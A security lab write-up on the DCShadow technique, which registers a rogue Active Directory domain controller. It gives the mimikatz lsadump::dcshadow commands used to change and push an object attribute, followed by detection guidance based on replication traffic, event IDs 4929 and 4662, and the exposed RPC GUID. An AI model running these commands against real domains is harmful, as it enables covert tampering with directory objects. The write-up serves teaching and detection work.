# DCShadow - Becoming a Rogue Domain Controller

DCShadow allows an attacker with enough privileges to create a rogue Domain Controller and push changes to the DC Active Directory objects.

### Execution

For this lab, two shells are required - one running with `SYSTEM` privileges and another one with privileges of a domain member that is in `Domain admins` group:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJjXyfdkTQyzJhifKIt%2F-LJjY-mOdiUf3J4dwpWf%2Fdcshadow-privileges.png?alt=media\&token=ce97cd8f-e8cd-404c-9e9a-a9e5d2c73665)

In this lab, I will be trying to update the AD object of a computer `pc-w10$`. A quick way to see some of its associated properties can be achieved with the following powershell:

```csharp
PS c:\> ([adsisearcher]"(&(objectCategory=Computer)(name=pc-w10))").Findall().Properties
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJjVrbxM-cGEM-Z8Sub%2F-LJjVvinH0mo71Dof2z9%2Fdcshadow-computer-properties.png?alt=media\&token=3f625a13-94bf-4781-adc5-1e5acfff29bb)

Note the `badpwcount` property which we will try to change with DCShadow by setting the value to 9999:

{% code title="mimikatz\@NT/SYSTEM console" %}
```csharp
mimikatz # lsadump::dcshadow /object:pc-w10$ /attribute:badpwdcount /value=9999
```
{% endcode %}

We can now push the change to the primary Domain Controller `DC-MANTVYDAS`:

{% code title="mimikatz\@Domain Admin console" %}
```csharp
lsadump::dcshadow /push
```
{% endcode %}

Below are the screenshots of the above commands and their outputs as well as the end result, indicating the `badpwcount`value getting changed to 9999:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJjVrbxM-cGEM-Z8Sub%2F-LJjVviol-7v0bxlvdhz%2Fdcshadow-computer-properties-changed.png?alt=media\&token=e6318ecf-1ea7-44ca-a374-4eda6a324829)

### Observations

As suggested by Vincent Le Toux who co-presented the [DCShadow](https://www.youtube.com/watch?v=KILnU4FhQbc), in order to detect this type of rogue activity, you could monitor the network traffic and suspect any non-DC hosts (our case it is the PC-W10$ with `10.0.0.7`) issuing RCP requests to DCs (our case DC-MANTVYDAS with `10.0.0.6`) as seen below:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJjcT3M05BJC-LM990G%2F-LJjcWqgR7ON1X_8Hzh_%2Fdcshadow-traffic.png?alt=media\&token=c1729e10-a625-4bf7-971b-708d31ed2ea3)

Same for the logs, if you see a non-DC host causing the DC to log a `4929` event (Detailed Directory Service Replication), you may want to investigate what else is happening on that system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJjfgHyTkJ7_kLRSOID%2F-LJjjCG1iC852bjFMoaX%2Fdcshadow-logs.png?alt=media\&token=f4dddcf6-87e2-434c-b03a-2a829081dacf)

Current implementation of DCShadow in mimikatz creates a new DC and deletes its associated objects when the push is complete in a short time span and this pattern could potentially be used to trigger an alert, since creation of a new DC, related object modifications and their deletion all happening in 1-2 seconds time frame sound anomalous. Events `4662` may be helpful for identifying this:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJk2jeIqG09PgTsZThd%2F-LJk96HM2cjsRgkGXEu9%2Fdcshadow-createobject.png?alt=media\&token=1b8b0264-1bec-4d21-bf33-58bd5adf8767)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJk2jeIqG09PgTsZThd%2F-LJk9e1ZN4ie0Rf01m3j%2Fdcshadow-delete1.png?alt=media\&token=70b2b36b-4d9f-449c-944e-fc00a07df748)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJk2jeIqG09PgTsZThd%2F-LJk9gb3M7TdkXZe1EKz%2Fdcshadow-delete2.png?alt=media\&token=bec107b6-57e9-42bb-a2d5-7245860779b7)

&#x20;One other suggestion for detecting rogue DCs is the idea that the computers that expose an RPC service with a GUID of `E3514235–4B06–11D1-AB04–00C04FC2DCD2`, but do not belong to a `Domain Controllers` Organizational Unit, should be investigated.

We see that our suspicious computer exposes that exact service:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJopOhhHbIFR8EiqpUy%2F-LJor2wd63PpCjm0k0fp%2Fdcshadow-services.png?alt=media\&token=c429044a-ddad-4d08-b877-c5a5922c7648)

..but does not belong to a `Domain Controllers` OU:

```csharp
([adsisearcher]"(&(objectCategory=computer)(name=pc-w10))").Findall().Properties.distinguishedname
# or
(Get-ADComputer pc-w10).DistinguishedName
```

![Outputs for computer NOT belonging to DC OU and one belonging, respecitvely](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJopOhhHbIFR8EiqpUy%2F-LJoplkjHLF16doWI9dy%2Fdcshadow-ou-dc.png?alt=media\&token=567b0b27-fa17-487f-b91f-e9f36fdff541)

### References

Below are the resources related to DCShadow attack. Note that there is also a link to youtube by a security company Alsid, showing how to dynamically detect DCShadow, so please watch it.

{% embed url="https://attack.mitre.org/wiki/Technique/T1207" %}

{% embed url="https://www.youtube.com/watch?v=KILnU4FhQbc" %}

{% embed url="http://www.labofapenetrationtester.com/2018/04/dcshadow.html" %}
